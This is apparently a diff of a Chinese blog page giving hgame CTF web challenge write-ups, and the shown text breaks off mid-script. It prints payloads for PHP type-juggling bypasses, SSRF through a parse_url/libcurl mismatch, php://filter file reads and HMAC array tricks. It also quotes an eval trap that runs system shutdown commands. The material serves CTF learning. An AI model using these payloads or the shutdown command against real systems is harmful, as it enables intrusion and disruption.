(string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((string)$str5&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 8 fial'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url, PHP_URL_HOST) !== <span class="string">"www.baidu.com"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 9 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class="string">"http"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 10 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">if</span>($output === <span class="keyword">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 11 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3[]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php</span><br></pre></td></tr></table></figure>
-<p>用两个@的原因可以参考这篇文章<a href="https://xz.aliyun.com/t/2215#toc-15" target="_blank" rel="noopener">ref</a></p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php</span><br></pre></td></tr></table></div></figure>
+<p>用两个@的原因可以参考这篇文章<span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/2215#toc-15" target="_blank" rel="noopener">ref</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <ul>
 <li>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com </li>
 <li>进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过<br>此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</li>
 </ul>
 <p>可以得到admin.php页面的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-<p>查看代码可知存在flag.php页面，关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] != <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'only localhost can see it'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]??<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></div></figure>
+<p>查看代码可知存在flag.php页面，关键代码如下：<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry,you can't see it"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p>
 <p>当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3[]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></div></figure>
 <p>flag.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag = hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="PHP-Is-The-Best-Language">
+          <a href="#PHP-Is-The-Best-Language" class="heading-link"><i class="fas fa-link"></i></a>PHP Is The Best Language</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>;</span><br><span class="line"><span class="comment">#echo $flag;</span></span><br><span class="line"><span class="comment">#echo $secret;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>代码审计题目，核心代码在于</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123;</span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret);</span><br><span class="line">&#125;</span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret);</span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是<strong>数组(Array)</strong>，由于数组是hash_hmac无法处理的输入类型，所以会返回<strong>null</strong></p>
 <p>第二处在于<code>(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1</code></p>
 <p>此处我们可以爆破</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">9999999999</span>;$i++)&#123;</span><br><span class="line">	<span class="keyword">if</span> ((md5($i)+<span class="number">1</span>) == (md5(md5($i)))+<span class="number">1</span>) &#123; </span><br><span class="line">		<span class="keyword">echo</span> $i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">9999999999</span>;$i++)&#123;</span><br><span class="line">	<span class="keyword">if</span> ((md5($i)+<span class="number">1</span>) == (md5(md5($i)))+<span class="number">1</span>) &#123; </span><br><span class="line">		<span class="keyword">echo</span> $i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
 <p>结果为12</p>
 <p>最终payload为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">door[]=12&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">door[]&#x3D;12&amp;key&#x3D;12&amp;gate&#x3D;4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></div></figure>
 <p>flag如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><p>题目考察我们的爬虫能力，真的做的我胃疼</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="Baby-Spider">
+          <a href="#Baby-Spider" class="heading-link"><i class="fas fa-link"></i></a>Baby_Spider</h2>
+      <p>题目考察我们的爬虫能力，真的做的我胃疼</p>
 <p>题目一共30关，40秒内答对30关的数学题即可获得flag</p>
 <ul>
-<li>1-10<br>需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda __g: [(os.system(&apos;shutdown -s -t 0&apos;), (os.system(&apos;shutdown now&apos;), None)[1])[1] for __g[&apos;os&apos;] in [(__import__(&apos;os&apos;, __g, __g))]][0])(globals())#-----=?</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
+<li><p>1-10<br>需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda __g: [(os.system(&#39;shutdown -s -t 0&#39;), (os.system(&#39;shutdown now&#39;), None)[1])[1] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0])(globals())#-----&#x3D;?</span><br></pre></td></tr></table></div></figure>
 <p>由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~）</p>
-<ul>
-<li>11-20<br>第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">      font-family: Ariali;</span><br><span class="line">      src: url(&apos;/static/Ariali.otf&apos;);</span><br><span class="line">      font-weight: normal;</span><br><span class="line">      font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-</ul>
-<p>下载字体<br><img src="https://i.loli.net/2019/02/11/5c614ba6c3e49.png" alt=""><br>可以看到数字对应规则变化了，对应置换一下即可</p>
-<ul>
-<li>21-30<br>此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可</li>
+<li><p>11-20<br>第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">      font-family: Ariali;</span><br><span class="line">      src: url(&#39;&#x2F;static&#x2F;Ariali.otf&#39;);</span><br><span class="line">      font-weight: normal;</span><br><span class="line">      font-style: normal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>下载字体<br><img src="https://i.loli.net/2019/02/11/5c614ba6c3e49.png" alt><br>可以看到数字对应规则变化了，对应置换一下即可</p>
+</li>
+<li><p>21-30<br>此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可</p>
+</li>
 </ul>
 <p>最终paylaod如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">token = <span class="string">"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>&#125;</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://111.231.140.29:10000"</span></span><br><span class="line">url2 = <span class="string">"http://111.231.140.29:10000/question"</span></span><br><span class="line">url3 = <span class="string">"http://111.231.140.29:10000/solution"</span></span><br><span class="line">url4=<span class="string">'http://111.231.140.29:10000/statics/style.css'</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url1,data=dict(token=token))</span><br><span class="line">cookies = res.cookies</span><br><span class="line">al_list = <span class="string">'1026943587'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="comment"># res = requests.get(url2,cookies=cookies,headers=headers)</span></span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">21</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    exp = re.findall(<span class="string">r'&lt;span&gt;(.+)&lt;/span'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    exp = list(exp)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(exp)):</span><br><span class="line">        <span class="keyword">if</span> ord(exp[x])&gt;<span class="number">47</span> <span class="keyword">and</span> ord(exp[x]) &lt; <span class="number">59</span>:</span><br><span class="line">            exp[x] = al_list[ord(exp[x])<span class="number">-48</span>]</span><br><span class="line">    exp = <span class="string">""</span>.join(exp)</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">21</span>,<span class="number">31</span>):</span><br><span class="line">    print(<span class="string">'-------------round'</span>,i,<span class="string">'---------------'</span>)</span><br><span class="line">    res = requests.get(url4,cookies=cookies,headers=headers)</span><br><span class="line">    exp = re.findall(<span class="string">r'content:"(.+)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">    print(exp)</span><br><span class="line">    data = dict(answer=str(eval(exp[:<span class="number">-2</span>])))</span><br><span class="line">    res = requests.post(url3,cookies=cookies,data=data,headers=headers)</span><br><span class="line">    cookies = res.cookies</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">token = <span class="string">"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL"</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'</span>&#125;</span><br><span class="line"></span><br><span class="line">url1 = <span 